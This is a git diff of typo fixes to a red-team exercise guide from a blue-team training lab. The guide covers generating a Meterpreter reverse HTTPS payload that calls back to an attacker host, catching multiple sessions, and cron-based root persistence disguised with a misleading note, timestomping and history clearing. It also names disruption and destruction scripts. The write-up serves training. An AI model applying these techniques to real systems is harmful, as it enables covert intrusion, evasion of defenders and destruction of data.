@@ -1,6 +1,6 @@
 # Guide   
 
-This is a guide to setting up a reverse shell and gaining persistance in the environment. 
+This is a guide to setting up a reverse shell and gaining persistence in the environment. 
 
 #### Table of Contents   
 * [Scenario](#scenario)     
@@ -13,17 +13,17 @@ This is a guide to setting up a reverse shell and gaining persistance in the env
 
 ## <a name="scenario">Scenario</a>
 
-We were told to create a payload that will be ran on the blue team training environment 45 minutes after the blue team powers on and starts hardening their network. Our goal was be to stealthly persist as many systems as possilble day one. Day two if we still had any persistance we were to make our presence known by the defenders.(EX: Change background, delete firewall rules and remove files)
+We were told to create a payload that will be ran on the blue team training environment 45 minutes after the blue team powers on and starts hardening their network. Our goal was to stealthily persist as many systems as possilble day one. Day two, if we still had any persistence, we were to make our presence known to the defenders.(EX: Change background, delete firewall rules and remove files)
 
 ### Hints   
 
-* Linux 64x   
+* Linux x64   
 * firewall is up but systems require 80,443,53 outbound
 
 
 ## <a name="payload">Creating your Payload<a/>
 
-There are many ways to create a payload but one of the easiest is by using msfvenom.  
+There are many ways to create a payload, but one of the easiest is by using msfvenom.  
 Finding a payload to use can be done by listing all payloads with `msfvenom -l payloads`   
 We can further filter this down to fit our requirements by piping this to grep.   
 
@@ -128,10 +128,10 @@ Evasion options for payload/linux/x64/meterpreter_reverse_https:
     ----  ---------------  --------  -----------
 ```
 
-You can see that the Basic options of LHOST and LPORT are required, to input these options you put the variables in after the the payload, before the next argument.   
+You can see that the Basic options of LHOST and LPORT are required. To input these options, you put the variables in after the payload, before the next argument.   
 `msfvenom -p linux/x64/meterpreter_reverse_https LPORT=443 LHOST=10.0.0.1`   
 
-After this other important arguments are:   
+After this, other important arguments are:   
 ```
 --arch              # Set Architecture    
 --platform          # Set Platform   
@@ -141,7 +141,7 @@ After this other important arguments are:
 ```
 All of these arguments can be used with --list to show valid options.   
 
-For our Senario -f elf was used.
+For our scenario, -f elf was used.
 
 The final command should look as follows:   
 ```console
@@ -157,9 +157,9 @@ Saved as: reverse_shell
 
 ## <a name="callback">Receiving our Callback<a/>
 
-First we will need to allow traffic though our redirector to receive our payloads.  For a reference on how to do this visit my [Redirector](https://github.com/vipertooth/Notes/blob/master/digitalocean/redirector.md) and [Iptables](https://github.com/vipertooth/Notes/blob/master/digitalocean/setup.md#setting-up-iptables-rules) writeup.   
+First we will need to allow traffic through our redirector to receive our payloads.  For a reference on how to do this, visit my [Redirector](https://github.com/vipertooth/Notes/blob/master/digitalocean/redirector.md) and [Iptables](https://github.com/vipertooth/Notes/blob/master/digitalocean/setup.md#setting-up-iptables-rules) writeups.   
 
-To catch our callback we will use metasploit, to start metasploit run msfconsole.
+To catch our callback, we will use Metasploit. To start Metasploit, run msfconsole.
 
 ```console
 root@kali:~# msfconsole
@@ -234,7 +234,7 @@ Exploit target:
 
 ```
 
-Then set the LHOST and LPORT.  This would normally be enought to receive the callback however in this senario we will be getting multiple callbacks.  To fix this we will need to change the advanced setting ExitOnSession to false and run the handler as a job.
+Then set the LHOST and LPORT.  This would normally be enough to receive the callback, however in this scenario we will be getting multiple callbacks.  To fix this, we will need to change the advanced setting ExitOnSession to false and run the handler as a job.
 
 ```console
 msf5 exploit(multi/handler) > run -j
@@ -253,11 +253,11 @@ Jobs
   0   Exploit: multi/handler  linux/x64/meterpreter_reverse_https  https://10.0.0.1:443
 ```
 
-This will allow metasploit to catch meterpreter shells untill the job is killed.
+This will allow Metasploit to catch Meterpreter shells until the job is killed.
 
 ## <a name="persistence">Gaining Persistence<a/>
 
-To find a way to persist we can start by searching all the metasploit modules for persistence with the search command.
+To find a way to persist, we can start by searching all the Metasploit modules for persistence with the search command.
 
 ```console
 msf5 > search persistence
@@ -292,7 +292,7 @@ Matching Modules
    22  post/windows/manage/persistence_exe                                    normal     No     Windows Manage Persistent EXE Payload Installer 
 ```
 
-We can filter this down with by specifying the platform we are looking for.
+We can filter this down by specifying the platform we are looking for.
 
 ```console
 msf5 > search platform linux -S persistence
@@ -312,7 +312,7 @@ Matching Modules
    674  post/linux/manage/sshkey_persistence                                                       excellent  No     SSH Key Persistence
    ```
 
-This will leave us with 8 possible methods for gaining persistence on our targets. We will want to view each of these to see what method to use.  This can be done with the info commands.   
+This will leave us with 8 possible methods for gaining persistence on our targets. We will want to view each of these to see what method to use.  This can be done with the info command.   
 
 ```console
 msf5 > info exploit/linux/local/cron_persistence
@@ -357,9 +357,9 @@ Description:
   of the cron entry.
   ```
   
-We decided to use this module during testing.  We found that it worked however it was very easy to notice that there was an adversary on the box and where to find the his persistance.  Instead we decided to use a custom exploit based on this module.
+We decided to use this module during testing.  We found that it worked, however it was very easy to notice that there was an adversary on the box and where to find his persistence.  Instead, we decided to use a custom exploit based on this module.
   
-To do that we created a resource file for metasploit that will upload a payload and execute it.
+To do that we created a resource file for Metasploit that will upload a payload and execute it.
 
 #### Resource file    
 uploadandrun.rc   
@@ -375,7 +375,7 @@ end
 </ruby>
 ```
 
-This file will upload the file AutoPWN to the tmp directory on each of the sessions that are currently open.  Then it will make the file executable and execute the file with root.
+This file will upload the file AutoPWN to the tmp directory on each of the sessions that are currently open.  Then it will make the file executable and execute the file as root.
 
 #### Payload file    
 AutoPWN    
@@ -391,7 +391,7 @@ history -c
 sleep 60 && kworker
 ```
 
-This payload will find the meterpreter payload that I created and copy it to /sbin/.  Then it will write into the crontab the job to run my payload ever 30 min.  It also put in a note about how it is required so the blue team might look over it.  Then it will change the file modification date with the touch command so the exploit will have the same date as route.  This will make it harder to find.  Finally it will clean up the payload file, clear history and launch the meterpreter payload as root.
+This payload will find the Meterpreter payload that I created and copy it to /sbin/.  Then it will write into the crontab the job to run my payload every 30 min.  It also put in a note about how it is required so the blue team might overlook it.  Then it will change the file modification date with the touch command so the exploit will have the same date as route.  This will make it harder to find.  Finally it will clean up the payload file, clear history, and launch the Meterpreter payload as root.
 
 ![alt text](https://github.com/vipertooth/Notes/blob/master/Lab1/Pictures/runandexecute.png)
 ![alt text](https://github.com/vipertooth/Notes/blob/master/Lab1/Pictures/newsessions.png)
@@ -399,7 +399,7 @@ This payload will find the meterpreter payload that I created and copy it to /sb
 
 ## <a name="disruption">Disruption<a/>   
 
-To dirupt the blue team we changed the background and played music.
+To disrupt the blue team, we changed the background and played music.
 
 To change the background we ran a resource file:   
 mass-background-change.rc   
@@ -415,7 +415,7 @@ end
 </ruby>
 ```
 
-To play music again we ran a resource file:   
+To play music again, we ran a resource file:   
 mass-audio-rickroll.rc   
 ```ruby
 <ruby>
@@ -433,7 +433,7 @@ end
 
 ## <a name="destruction">Destruction<a/>
 
-To destroy all remaining systems we also ran a resource file:   
+To destroy all remaining systems, we also ran a resource file:   
 mass-destruction.rc  
 ```ruby
 <ruby>
